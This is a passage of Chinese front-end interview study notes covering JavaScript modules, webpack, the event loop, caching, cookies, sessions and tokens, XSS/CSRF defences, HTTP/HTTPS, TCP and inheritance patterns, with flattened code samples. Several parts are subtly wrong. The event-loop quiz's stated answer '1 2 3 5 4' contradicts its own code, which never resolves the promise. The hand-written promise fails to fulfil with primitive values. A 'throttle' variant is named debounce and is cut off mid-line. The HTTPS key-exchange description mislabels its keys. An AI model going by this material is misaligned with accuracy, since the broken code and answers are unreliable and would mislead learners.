2, 1]var res = d.reduce((acc, cur, index, d) =&gt; &#123; return acc + cur&#125;, 0)// 9 将一个长度不超过5位数的正整数转换成对应的中文字符，如 20976，返回 两万零八百七十六 js 在跨越方面有哪些方法 原生 js 实现类继承的方法 常用的前端优化方法有哪些 什么是 XSS、CSRF，怎么防范 下面的代码，输出的结果是什么 12345678910111213141516(function test() &#123; setTimeout(() =&gt; &#123;console.log(4)&#125;, 0); new Promise(function excutor(resolove) &#123; console.log(1) for(var i=0; i&lt;1000; i++) &#123; i==9999 &amp;&amp; resolove() &#125; console.log(2) &#125;).then(function() &#123; console.log(5) &#125;) console.log(3)&#125;)()// 1 2 3 5 4 面试题 顶层对象的属性let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从 ES6 开始，全局变量将逐步与顶层对象的属性脱钩。 12let a = 1window.a // undefined constconst实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，const只能保证这个指针是固定的（即总是指向另一个固定的地址），至于它指向的数据结构是不是可变的，就完全不能控制了 123const obj = &#123;a:1&#125;obj.a=2obj // &#123;a:2&#125; ts any unknow never 断言 python is vs ==is比较的是两个对象的id，也就是比较两个对象是否为同一个实例对象，是否指向同一个内存地址==比较的是两个对象的内容，默认会调用对象的eq()方法 高频问题 module.exports 和 exports 区别module.exports 初始值为一个空对象 {}，如果module.exports初始时已经具备一些属性和方法，那么exports收集来的信息将被忽略exports 是指向的 module.exports 的引用, 即 exports = module.exportsmodule.exports才是真正的接口，exports只不过是它的一个辅助工具。require() 返回的是 module.exports 而不是 exports可以 exports.name= {}, 不能 exoprts = {} 模块化AMD 异步模块定义。RequireJS预先加载，依赖前置。 浏览器第一，异步加载模块。CMD 通用模块定义。SeaJS 按需加载，依赖就近。 AMD和CMD最大的区别是对依赖模块的执行时机处理不同，不是加载的时机或者方式不同(都是异步加载模块)。UMD 先判断是否支持AMD，再检验CommonJS环境，否则认为当前环境为浏览器环境CommonJS。 Node服务器端模块的规范，同步加载模块。 require/module.exports/exports。当引用同一个模块时，不会再次加载，而是获取缓存；可重新赋值。ES6模块，动态只读引用。原始值发生变化，import加载的值也会发生变化；不允许修改引入变量的值。 require commonjs 通过require引入基础数据类型时，属于复制该变量,会被模块缓存，可重新赋值; 引入复杂数据类型时，数据浅拷贝该对象; CommonJS模块默认export的是一个对象，即使导出的是基础数据类型 import ES6 对该变量的动态只读引用。动态在于一个模块中变量的变化会影响到另一个模块；只读在于从某个模块引入一个变量时，不允许修改该变量的值。对于复杂数据类型，可以添加属性和方法，但是不允许指向另一个内存空间。 import 被提升 前端构建工具构建工具是一个把源代码转换成可执行代码的过程。包括下载依赖、代码转换、文件优化、代码分割、模块合并压缩、自动刷新、代码校验、单元测试、自动发布。自动化构建是编写或使一大部分任务自动执行的一个动作，而这些任务则是软件开发者的日常。 webpackwebpack: 打包模块化js的工具。在webpack里，一切文件都是模块，通过 Loader 加载转换文件，通过 plugin 注入钩子，扩展 webpack，最后输出由多个模块组成的文件。优点：专注于模块化，开箱即用一步到位；通过plugin拓展，完整好用又不失灵活；使用场景不局限于web开发；社区庞大活跃；良好的开发体验缺点: 只能用于模块化开发 打包原理: 首先 minifest.js 会定义一个 webpackJsonp 方法，待其他打包后的文件（也可称为 chunk）调用。当调用 chunk 时，会先将该 chunk 中所有的 moreModules， 也就是每一个依赖的文件也可称为 module （如 test.js）存起来。之后通过 executeModules 判断这个文件是不是入口文件，决定是否执行第一次 webpack_require 。而 webpack_require 的作用，就是根据这个 module 所 require 的东西，不断递归调用 webpack_require，webpack_require函数返回值后供 require 使用。当然，模块是不会重复加载的，因为 installedModules 记录着 module 调用后的 exports 的值，只要命中缓存，就返回对应的值而不会再次调用 module。webpack 打包后的文件，就是通过一个个函数隔离 module 的作用域，以达到不互相污染的目的。123456789101112131415161718192021222324252627282930// manifest.js(function(modules) &#123; window["webpackJsonp"] = function webpackJsonpCallback(chunkIds, moreModules, executeModules) &#123; var moduleId, result; for (moduleId in moreModules) &#123; if (Object.prototype.hasOwnProperty.call(moreModules, moduleId)) &#123; modules[moduleId] = moreModules[moduleId]; &#125; &#125; if (executeModules) &#123; for (i = 0; i &lt; executeModules.length; i++) &#123; result = __webpack_require__(executeModules[i]); &#125; &#125; return result; &#125;; var installedModules = &#123;&#125;; function __webpack_require__(moduleId) &#123; if (installedModules[moduleId]) &#123; return installedModules[moduleId].exports; &#125; var module = installedModules[moduleId] = &#123; exports: &#123;&#125; &#125;; modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); return module.exports; &#125;&#125;)([]); 宏任务、微任务宏任务: 主代码块(鼠标事件，键盘事件, ajax、script) &gt; setImmediate &gt; MessageChannel &gt; setTimeout / setInterval。微任务: process.nextTick &gt; Promise &gt; MutationObserver 浏览器中的多线程JavaScript引擎线程，用于解析JavaScript代码GUI渲染线程，（它与javaScript线程是互斥的）事件线程(onclick,onchange,…)定时器线程(setTimeout, setInterval)异步http线程(ajax)，负责数据请求EventLoop轮询处理线程，事件被触发时该线程会把事件添加到待处理队列的队尾 缓存缓存分为Nginx、Apache服务端侧（CDN缓存）和客户端侧（浏览器缓存）。浏览器缓存分为强缓存和协商缓存。强缓存不发请求到服务器，协商缓存会发请求到服务器。 设置缓存HTML Meta标签控制缓存， 如 meta http-equiv=”pragma” content=”no-cache” 兼容性一般HTTP头信息控制缓存Expires（强），服务器缓存过期绝对时间，可能有误差不同步Cache-control（强），客户端相对时间。 no-cache 缓存前需和服务器确认； no-store 禁止一切缓存Last-Modified/If-Modified-Since（协商缓存）Etag/If-None-Match（协商缓存） 什么是进程、线程进程是 操作系统 资源分配和调度 的最小单位，它是程序执行时的一个实例，进程有自己的独立地址空间线程是 CPU调度和分派 程序执行的最小单位，它是进程的一个实体，线程共享进程中内存 前端权限控制方案按细粒度可分为路由、视图、请求三个层面的控制。1、登录权限，用户鉴权。登录后获得一个 token，然后在请求 Headers 中设置 “Authorization”。token 会存进 sessionStorage 里，用户刷新将直接使用本地 token 授权，并重新获取权限数据，如果本地 token 失效，那么后端应该返回 401 状态码，前端跳回登陆界面。2、获取权限数据，用户权限初始化，后端返回路由和资源权限数据。2、页面路由，用户登录后只能看到自己有权访问的导航菜单和路由地址，否则将跳转 4xx 提示页。路由钩子beforeEach和addRoutes实现动态路由及菜单。3、按钮元件，显示隐藏用指令做，v-if或指令仅使用bind回调。4、接口请求控制，http请求拦截器，拦截越权请求。 mongodb 和 mysql 区别(1) MongoDB数据库更适合那些读作业较重的任务模型。MongoDB能充分利用机器的内存资源。如果机器的内存资源丰富的话，MongoDB的查询效率会快很多。(2) MySQL数据库更适合插入、更新为主的任务模型，其效率相比于MongoDB优势非常明显。(3) 在带”_id”插入数据的时候，MongoDB的插入效率其实并不高。如果想充分利用MongoDB性能的话，推荐采取不带”_id”的插入方式，然后对相关字段作索引来查询。(4) MongoDB适合那些对数据库具体数据格式不明确或者数据库数据格式经常变化的需求模型，而且对开发者十分友好，但对运维不友好。(5) 稳定性方面，MySQL非常稳定的数据库，无论在指定主键还是在不指定主键插入的情况下，其效率都差不了太多。(6) 事务支持方面，MySQL占绝对优势，MongoDB对事务关系支持薄弱，这也是所有NoSQL数据库共同的缺陷。 token、cookie、sessionHTTP 应用层的面向对象的协议，有五大特点：1、支持 B/S 模式；2、简单快速；3、灵活；4、无连接，每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接；5、无状态，事务处理没有记忆能力，每个请求都是独立的，不会记录任何信息。 session和cookie流程由于http的无状态，为了使某个域名下的所有网页能够共享某些数据，session和cookie出现了。1、首先，客户端会发送一个http请求到服务器端。2、服务器端接受客户端请求后，建立一个session，并发送一个http响应到客户端，这个响应头就包含Set-Cookie头部。该头部包含了sessionId。Set-Cookie: name1=value1; name2=value2[; expires=date][; max-age=time][; domain=domain][; path=path][; HttpOnly][; secure]。3、在客户端发起的第二次请求，假如服务器给了 Set-Cookie，浏览器会自动在请求头中添加cookie。4、服务器接收请求，分解cookie，验证信息，核对成功后返回response给客户端。总之, session 有如用户信息档案表, 里面包含了用户的认证信息和登录状态等信息。cookie是实现session的一种方案。cookie存储在客户端，而session存储在服务器端。 cookie面临的问题1、csrf 攻击。可验证 HTTP Referer 判断请求的来源地址、token验证、自定义在HTTP头属性。 xss 漏洞：不用DOM中的内联事件监听器；将输入的数据进行转义处理；使用成熟的 Vue/React框架；Set-Cookie: HttpOnly;CSP: 如Content-Security-Policy: default-src ‘self’ *.trusted.com;设置 HTTP Header：X-XSS-Protection: 0 (禁止XSS过滤) / 1; mode=block (当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面)。 2、有的客户端不支持cookie。小程序需要手动设置；有些浏览器不能手动设置cookie；对于混合嵌套的开发有问题，如小程序跳转H5页面，不能携带cookie。3、浏览器对单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。 session面临的问题1、负载均衡多服务器的情况，不好确认当前用户是否登录，因为多服务器不共享session。这个问题也可以将session存在一个服务器中来解决，但是就不能完全达到负载均衡的效果。可以通过Nginx 做负载均衡的Session保持、使用Redis存储Session、Django设置Session共享等。2、每个客户端只需存储自己的session id，但是服务端却需要存储所有用户session id，对服务器也是一个压力。 token 令牌由uid+time+sign[+固定参数]。token 的认证方式类似于临时的证书签名, 并且是一种服务端无状态的认证方式, 非常适合于 REST API 的场景。token在客户端一般存放于localStorage，cookie或sessionStorage中。在服务器一般存于数据库中。 jwt（json web token）由三个部分组成：header.payload.signature。服务端把用户信息加密 token 传给客户端，客户端每次访问都返回token，服务端解密token，就知道这个用户是谁了。通过cpu加解密，服务端就不需要存储session id占用存储空间，就很好的解决负载均衡多服务器的问题了。但token的状态和过期时间需要自己手动设置，比如，token中存储用户登录的时间，服务端每次验证这个时间是否过期就可以了。 token认证流程与cookie很相似:用户登录，成功后服务器返回token给客户端。客户端收到数据后保存在客户端客户端再次访问服务器，将token放入headers中服务器端采用filter过滤器校验。校验成功则返回请求数据，校验失败则返回错误码 token 和 cookie session 区别1、token可以抵抗csrf，cookie、session不行。token是开发者为了防范csrf而特别设计的令牌，浏览器不会自动添加到headers里，即使form 发起的 POST 请求并不受到浏览器同源策略的限制，攻击者也无法访问用户的token，所以提交的表单无法通过服务器过滤，也就无法形成攻击。2、session存储于服务器，可以理解为一个状态列表，拥有一个唯一识别符号sessionId，通常存放于cookie中。服务器收到cookie后解析出sessionId，再去session列表中查找，才能找到相应session。依赖cookie3、cookie 装有sessionId，存储在客户端，浏览器通常会自动添加。4、token 无状态，用户信息都被加密到token中，服务器收到token后解密就可知道是哪个用户。需要开发者手动添加。5、token 完全由应用管理，可以避开同源策略; cookie/session不可跨源，但其同源只关注域名和path，忽略协议和端口。 短轮询、长轮询、短连接、长连接短轮询: 客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。请求中有大半是无用，浪费带宽和服务器资源，端程序编写比较容易，适于小型应用。 长轮询: 客户端向服务器发送Ajax请求，服务器接到请求后hold住连接，有消息出现，服务器响应请求，并携带相应的数据。当有新消息、超时或网络故障，浏览器又会创建一个新请求。长轮询相对于短轮询减少了很多不必要的http请求次数，但数据顺序无法得到保证。长轮询是长连接的一种实现。 短连接: 短连接是指通讯双方有数据交互时，就建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。http 1.0一般就指短连接。 长连接: 也叫持久连接，建立连接后不立即断开，并在此连接的基础上进行多次消息交互，直至有一方主动断开连接。省去较多的TCP建立和关闭的操作，节约时间。长连接的技术主要是用Comet，采用的技术分浏览器来实现，ie上用iframe，其他浏览器用xhr来实现，html5有WebSocket。HTTP 1.1相对于1.0最重要的新特性就是引入了长连接。http1.0一般就指短连接，http1.0+的keep-alive、HTTP1.1的persisten 和 smtp,pop3,telnet这种就可以认为是长连接。一般的网络游戏应用、频繁交互的场景、即时通信工具都是长连接。 WebSocket: 单个TCP连接上进行全双工通信的协议。浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接，并进行双向数据传输。没有同源限制，客户端可以与任意服务器通信。 http1.0、http1.1、http2、https影响一个 HTTP 网络请求的因素主要有两个：带宽和延迟(浏览器阻塞，如谷歌浏览器对于同一个域名，最大并发连接为6个；DNS 查询；三次握手的建立连接)。 HTTP1.1版本新特性1、可扩展性HTTP1.1增加了OPTIONS方法，它允许客户端获取一个服务器支持的方法列表。HTTP1.1在请求消息中包含了Upgrade头域，通过该头域，客户端可以让服务器知道它能够支持的其它备用通信协议，服务器可以据此进行协议切换，使用备用协议与客户端进行通信。2、缓存处理HTTP1.0 使用expires + Last-Modified/If-Modified-Since来作为缓存判断的标准；HTTP1.1 引入了更多的缓存控制策略：Cache-Control、Etag/If-None-Match等。3、错误通知的管理HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。4、断点续传HTTP1.1在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。5、Host头处理HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。6、长连接HTTP1.1支持长连接和请求的流水线处理，在一个TCP连接上可以传送多个HTTP请求和响应，并默认开启Connection: keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点，减少了建立和关闭连接的消耗和延迟。 http2.01、引入二进制数据帧和流HTTP1.x的解析基于文本。HTTP2.0的协议解析采用二进制格式，数据传输分为二进制帧frame片段 每个帧都有顺序标号，一次的请求与被响应视为流stream。2、多路复用（MultiPlexing）浏览器在同一连接上一次触发多个请求，并以任何顺序接收请求。3、header压缩HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。4、服务端推送（server push）同SPDY一样，HTTP2.0也具有server push功能。 https vs httpHTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。 HTPS的工作过程HTTPS就是使用SSL/TLS协议进行加密传输。1、客户端向服务器发出加密通信的请求。请求中包含 支持自己支持的加密规则(协议版本、加密算法、哈希算法)。2、服务器生成一对 公钥A 和 私钥B，并回应请求。回应内容包含 确认的加密规则；以及数字证书(包含公钥A、网址、证书颁发机构)。3、客户端验证服务器证书。如果 证书不可信、证书中的域名与实际域名不一致、已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。如果 证书没有问题，客户端就会从证书中取出服务器的 公钥A。4、客户端生成一串随机数 私钥C，并用 公钥A 对该 随机数C 非对称加密，形成 私钥R，发送给服务器。5、服务器收到 私钥R 之后，使用自己的 私钥B 解密得到 私钥C，并以 私钥C 为密钥 对称加密 网页内容传输给客户端。6、客户端以 私钥C 为密钥，使用之前约定好的解密算法获取网页内容。 总结:对称加密是指加密和解密用一致的密钥，特点是快非对称加密是指密钥区分公钥和私钥，公钥加密，私钥解密（私钥好比唯一一把钥匙，公钥好比锁，钥匙只有一把，但锁可以有很多，被锁头锁上只有一把私钥才能打开） HTTPS就是使用SSL/TLS协议进行加密传输，让客户端拿到服务器的公钥，然后客户端随机生成一个对称加密的秘钥，使用公钥加密，传输给服务端，后续的所有信息都通过该对称秘钥进行加密解密，完成整个HTTPS的流程。 非对称加密算法：RSA，DSA/DSS对称加密算法：AES，RC4，3DESHASH算法：MD5，SHA1，SHA256 在 https 页面上不允许出现 http 请求，会提示报错CSP 设置 upgrade-insecure-requests 让浏览器自动升级请求，两种方法服务器响应头中加入: header(“Content-Security-Policy: upgrade-insecure-requests”);页面中加入 meta: meta http-equiv=”Content-Security-Policy” content=”upgrade-insecure-requests” TCP 建立连接 3次握手目的: 为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。 syn: synchronize sequence number 同步序列编号seq: sequence numberack: acknowledgment number1、客户端发送连接请求报文段: syn=1, seq=x。客户端进入SYN_SEND状态，等待服务器的确认； 2、服务器收到SYN报文段: syn=1,ack=x+1,seq=y。服务器进入SYN_RECV状态； 3、客户端收到服务器的报文: ack=y+1,seq=z。客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 TCP 连接终止 4次挥手目的: TCP 是全双工模式(数据的发送和接收分流，分别由两根不同的传输线传送时，通信双方都能在同一时刻进行发送和接收)，每个方向都必须单独进行关闭， 1、客户端发送FIN包，请求关闭连接: FIN=1, seq=x。表示客户端没有数据要发送了，但是仍然可以接受数据。客户端进入 FIN_WAIT_1 状态； 2、服务器收到FIN包，接收到关闭请求，但还没有准备好关闭连接: ACK=1，ACKnum=x+1。服务器端进入 CLOSE_WAIT 状态，客户端收到确认包后进入 FIN_WAIT_2 状态，等待服务器端关闭连接。 3、服务器发送FIN包，请求关闭连接: FIN=1，seq=y。服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。 4、客户端收到FIN包，向服务器发送ACK包: ACK=1，ACKnum=y+1。客户端进入TIME_WAIT状态，等待可能出现的要求重传的 ACK 包；服务器收到ACK包以后，关闭连接，进入 CLOSED 状态；客户端等待2MSL(Maximum Segment Lifetime最大段生命周期)后依然没有收到 ACK 回复，则认为服务端已正常关闭，于是，客户端也关闭连接，进入 CLOSED 状态。 为什么TCP建立链接是三次，关闭链接是四次:服务端的收到客户端SYN报文的连接请求后，它可以把 SYN和ACK（SYN起同步作用，ACK起应答作用）放在一个报文里来发送。但关闭连接时，当服务端收到客户端的FIN报文时，它仅仅表示客户端没有数据发送给服务端了；但未必服务端所有的数据都全部发送给客户端了。只有等服务端所有的报文都发送完了，才能发送FIN报文，因此ACK和FIN是分开发送的。故需要四步握手。 TCP vs UDP 区别TCP（TransmissionControlProtocol 传输控制协议）是面向连接的、可靠的、使用流量控制和拥塞控制、面向字节流。UDP（UserDataProtocol 用户数据报协议）是面向无连接的、简单不可靠、头部开销小、高效实时、面向报文。 怎么理解 promisePromise 是异步编程的一种解决方案，将异步操作以同步操作的流程表达出来，避免出现回调地狱。它是一个容器，里面保存着某个未来才会结束的事件的结果。ES6 规定，Promise对象是一个构造函数，用来生成Promise实例。 Promise对象有以下两个特点: 对象的状态不受外界影响，有三种状态：pending、fulfilled 和 rejected，只有异步操作的结果，可以决定当前是哪一种状态。 一旦状态改变，就不会再变化。 手写实现 promise 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function promise(fn) &#123; var state = 'pending', value = null, callbacks = [] this.then = function(onFulfilled, onRejected) &#123; return new Promise(function(resolve, reject) &#123; handle(&#123; onFulfilled: onFulfilled || null, onRejected: onRejected || null, resolve, reject &#125;) &#125;) &#125; function handle(callback) &#123; if(state === 'pending') &#123; callbacks.push(callback) return &#125; // then中没有传递任何东西 // if(!callback.onFulfilled) &#123; // callback.resolve(value) // return // &#125; // var ret = callback.onFulfilled(value) // callback.resolve(ret) var ret, cb cb = state === 'fulfilled' ? callback.onFulfilled : callback.onRejected if(cb === null) &#123; cb = state === 'fulfilled' ? callback.resolve : callback.reject cb(value) return &#125; try &#123; ret = cb(value) callback.resolve(ret) &#125; catch (e) &#123; callback.reject(e) &#125; &#125; function resolve(newValue) &#123; if(newValue &amp;&amp; (typeof newValue === 'object' || typeof newValue === 'function')) &#123; var then = newValue.then if(typeof then === 'function') &#123; then.call(newValue, resolve) return &#125; state = 'fulfilled' value = newValue excute() &#125; &#125; function reject(reason) &#123; state = 'rejected' value = reason excute() &#125; function excute() &#123; setTimeout(function() &#123; callbacks.forEach(function(callback) &#123; handle(callback) &#125;) &#125;, 0); &#125; fn(resolve, reject)&#125; xhr 12345678var xhr = new XMLHttpRequest();xhr.open('GET', url);xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; console.log(xhr.responseText) // 从服务器获取数据 &#125;&#125;xhr.send() fetch vs axiosajax是使用 原生xhr 对象做异步操作 fetch 是一种浏览器原生实现的请求方式，是ajax 的替代品，但更加底层，提供了丰富的API。只对网络请求报错，对400，500都当做成功的请求，需要封装去处理; 默认不会带cookie，需要添加配置项; 不支持abort，不支持超时控制；没有办法原生监测请求的进度。 axios 是一个基于Promise 用于浏览器和 nodejs 的 HTTP 客户端。从浏览器中创建 XMLHttpRequest，从 nodejs 发出 http 请求，支持 Promise API， 转换/拦截/取消请求和响应，自动转换JSON数据，客户端支持防止CSRF。 PWA (Progressive Web App)PWA的核心目标就是提升 Web App 的性能，改善 Web App 的用户体验。媲美native的流畅体验，将网络之长与应用之长相结合。 渐进式网页应用。PWA 不是特指某一项技术，而是应用了多项技术的 Web App。其核心技术包括 App Manifest、Service Worker、Web Push，等等。 Service WorkerService workers 本质上充当客户端与服务器之间的代理服务器。可以在网络可用时作为浏览器和网络间的代理。使得能够创建有效的离线体验，拦截网络请求、向客户端发送消息、向服务器发起请求、推送通知，离线资源缓存，处理多页面所需的复杂数据。 Service worker运行在worker上下文，因此它不能访问DOM。相对于驱动应用的主JavaScript线程，它运行在其他线程中，所以不会造成阻塞。它设计为完全异步，大量使用Promise，同步API（如XHR和localStorage）不能在service worker中使用。Service workers只能由HTTPS承载或者本地的 localhost 环境下。 vue vs react相同点:都是用于创建UI的JavaScript库，集中在视图层提供了响应式 (Reactive) 和组件化 (Composable) 的视图组件使用 Virtual DOM，有自己的diff渲染算法将注意力集中保持在核心库，而将其他功能如路由和全局状态管理交给相关的库。 主要区别:运行时性能，react需使用PureComponent 和 shouldComponentUpdate类html模板 vs JSX组件作用域内的 CSS: CSS-in-JS 的 styled-components vs scoped css状态管理 vs 对象属性: setState、data原生渲染: rn vs weexcra vs vue-cli生态系统构建一个大型应用程序: vue 的模板难以注意到的运行时错误、测试、重构和分解；React的immutable在大型应用中意义非凡,因为透明度和可测试性在大型项目中变得至关重要。 常见兼容性问题IE:1、HTML5Shiv 允许IE 9之前的版本识别HTML5标记，并允许他们使用CSS样式2、 获取元素高度dom.currentStyle.width 只有IE浏览器window.getComputedStyle(ele).widthdom.offsetWidth 最常用的、兼容最好3、清除浮动zoom: 1; IE4、允许网页宽度自动调整viewportcss3-mediaqueries.js IE8及以下 JS 如何实现继承 原型链继承引用类型的属性被所有实例共享; 在创建 Child 的实例时，不能向Parent传参 123456789101112131415function Parent () &#123; this.name = 'kevin';&#125;Parent.prototype.getName = function () &#123; console.log(this.name);&#125;function Child () &#123;&#125;Child.prototype = new Parent();var child1 = new Child();console.log(child1.getName()) // kevin 借用构造函数(经典继承)避免了引用类型的属性被所有实例共享；可以在 Child 中向 Parent 传参缺点: 方法都在构造函数中定义，每次创建实例都会创建一遍方法。 12345678910111213function Parent (name) &#123; this.name = name;&#125;function Child (name) &#123; Parent.call(this, name);&#125;var child1 = new Child('kevin');console.log(child1.name); // kevinvar child2 = new Child('daisy');console.log(child2.name); // daisy 组合继承融合原型链继承和构造函数的优点，是 JavaScript 中最常用的继承模式 123456789101112131415161718192021222324252627function Parent (name) &#123; this.name = name; this.colors = ['red', 'blue', 'green'];&#125;Parent.prototype.getName = function () &#123; console.log(this.name)&#125;function Child (name, age) &#123; Parent.call(this, name); this.age = age;&#125;Child.prototype = new Parent();Child.prototype.constructor = Child;var child1 = new Child('kevin', '18');child1.colors.push('black');console.log(child1.name); // kevinconsole.log(child1.age); // 18console.log(child1.colors); // ["red", "blue", "green", "black"]var child2 = new Child('daisy', '20');console.log(child2.name); // daisyconsole.log(child2.age); // 20console.log(child2.colors); // ["red", "blue", "green"] 原型式继承Object.create 的实现，将传入的对象作为创建的对象的原型。缺点：包含引用类型的属性值始终都会共享相应的值，这点跟原型链继承一样 12345function createObj(o) &#123; function F()&#123;&#125; F.prototype = o; return new F();&#125; 寄生式继承创建一个仅用于封装继承过程的函数，该函数在内部以某种形式来做增强对象，最后返回对象。缺点：跟借用构造函数模式一样，每次创建对象都会创建一遍方法。 1234567function createObj (o) &#123; var clone = Object.create(o); clone.sayName = function () &#123; console.log('hi'); &#125; return clone;&#125; 寄生组合式继承只调用了一次 Parent 构造函数，并且因此避免了在 Parent.prototype 上面创建多余的属性；原型链还能保持不变，因此还能够正常使用 instanceof 和 isPrototypeOf开发人员普遍认为寄生组合式继承是引用类型最理想的继承范式 123456789101112131415161718192021function Parent (name) &#123; this.name = name; this.colors = ['red', 'blue', 'green'];&#125;Parent.prototype.getName = function () &#123; console.log(this.name)&#125;function Child (name, age) &#123; Parent.call(this, name); this.age = age;&#125;// 关键的三步var F = function () &#123;&#125;;F.prototype = Parent.prototype;Child.prototype = new F();var child1 = new Child('kevin', '18');console.log(child1); ES6实现继承书写简单，底层其实也是用寄生组合式继承来实现的 123456789101112131415161718192021222324252627282930// 父类class SuperType &#123; constructor(name) &#123; this.name = name; this.colors = ["red", "blue", "green"]; &#125; sayName() &#123; console.log(this.name); &#125;;&#125;// 子类class SubType extends SuperType &#123; constructor(name, age) &#123; super(name); // 继承父类实例属性和prototype上的方法 this.age = age; // 子类实例属性 &#125; // 子类方法 sayAge() &#123; console.log(this.age); &#125;&#125;// 实例var instance1 = new SubType('Tom', 20);instance1.colors.push('black');instance1.sayAge(); console.log(instance1.colors); // ["red", "blue", "green", "black"] 事件委托利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件好处：给重复的节点添加相同操作，减少dom交互，提高性能实现思路：给父组件添加事件，通过事件冒泡，排查元素是否为指定元素，并进行系列操作 webpack提取第三方库或通过引用外部文件的方式引入第三方库代码压缩插件UglifyJsPlugin服务器启用gzip压缩按需加载资源文件 require.ensure优化devtool中的source-map剥离css文件，单独打包去除不必要插件，通常就是开发环境与生产环境用同一套配置文件导致开发环境采用增量构建，启用热更新开发环境不做无意义的工作如提取css计算文件hash等配置devtool选择合适的loader个别loader开启cache 如babel-loader第三方库采用引入方式提取公共代码优化构建时的搜索路径 指明需要构建目录及不需要构建目录模块化引入需要的部分 history vs hash 路由模式hash 地址栏 URL 中的 # 符号，hash 虽然出现在 URL 中，但不会被包括在 HTTP 请求中，对后端完全没有影响，因此改变 hash 不会重新加载页面。监听onhashchange事件history 利用了 HTML5 新增的 pushState() 和 replaceState() 方法。监听onpopstate事件，需要服务端配置路由支持覆盖 canvas元素用于图形的绘制，动画、缩放、各种滤镜和像素转换等高级操作 12345678&lt;canvas id="myCanvas" width="150" height="150"&gt;&lt;/canvas&gt;// 拿到 canvas 元素var c=document.getElementById("myCanvas");// 创建 context 对象var ctx=c.getContext("2d");// 绘制ctx.fillStyle = "rgb(200,0,0)";ctx.fillRect (10, 10, 55, 50); ssr服务端在返回 html 之前，在特定的区域，符号里用数据填充，再给客户端，客户端只负责解析 HTML 。html 仅仅作为静态文件，客户端端在请求时，服务端不做任何处理，直接以原文件的形式返回给客户端客户端，然后根据 html 上的 JavaScript，生成 DOM 插入 html。 注意点:服务端必须是 node.js 或者专门跑个 node.js 来支持；document 对象找不到，由于前端使用的 window，在 node 环境不存在；数据预获取时，组件尚未实例化（无法使用 this ），于是在 created 生命钩子调用 method 里的方法行不通，数据请求及格式化等操作都应该放置在专门的数据预取存储容器（data store）或”状态容器（state container）”中处理；string-based 模板性能肯定要比 virtual-dom-based 模板的性能好。string-base 模板只要填数据即可，virtual-dom-based 模板需要经历 Vue 模板语法 —&gt; Vnode —&gt; 拼接字符串 html 的过程。 防抖、节流 防抖 debounce高频事件被触发后n秒内只执行一次，如果n秒内再次被触发，则重新计时举例: 如果有人进电梯（触发事件），那电梯将在10秒钟后出发（执行事件监听器），这时如果又有人进电梯了（在10秒内再次触发该事件），又得等10秒再出发（重新计时）思路: 每次触发事件时都取消之前的延时调用方法场景: 搜索框搜索输入,只需用户最后一次输入完，再发送请求; 手机号、邮箱验证输入检测; 窗口大小resize，只需窗口调整完成后，计算窗口大小 123456789101112131415function debounce(fn) &#123; let timer = null; // 创建一个标记用来存放定时器的返回值 return function () &#123; clearTimeout(timer); // 每当用户输入的时候把前一个 setTimeout clear 掉 timer = setTimeout(() =&gt; &#123; // 然后又创建一个新的 setTimeout, 这样就能保证输入字符后的 interval 间隔内如果还有字符输入的话，就不会执行 fn 函数 fn.apply(this, arguments); &#125;, 500); &#125;;&#125;function sayHi() &#123; console.log('防抖成功');&#125;var inp = document.getElementById('inp');inp.addEventListener('input', debounce(sayHi)); // 防抖 节流 throttle高频事件触发，但在单位时间内只会执行一次，下次执行要间隔一段时间，如果这个单位时间内触发多次函数，只有一次生效，相当于技能冷却举例: 保证如果电梯第一个人进来后，10秒后准时运送一次，这个时间从第一个人上电梯开始计时，不等待，如果没有人，则不运行思路: 每次触发事件时都判断当前是否有等待执行的延时函数场景：滚动加载，是否滑到底部自动加载更多；鼠标不断点击触发，表单重复提交 12345678910111213141516171819202122232425262728293031323334// 实现一function throttle(fn) &#123; let canRun = true // 通过闭包保存一个标记 return function() &#123; if(!canRun) return // 在函数开头判断标记是否为true，不为true则return canRun = false setTimeout(() =&gt; &#123; // 当定时器没有执行的时候标记永远是false，在开头被return掉 fn.apply(this, arguments) canRun = true // setTimeout执行完毕后把标记设置为true 表示可以执行下一次循环了 &#125;, 500); &#125;&#125;// 实现二function debounce(fn) &#123; let timer = null, start = null return function() &#123; let now = Date.now() if(!start) &#123; start = now &#125; clearTimeout(timer) //总是干掉事件回调 // 主动执行一次 if(now - start &gt; 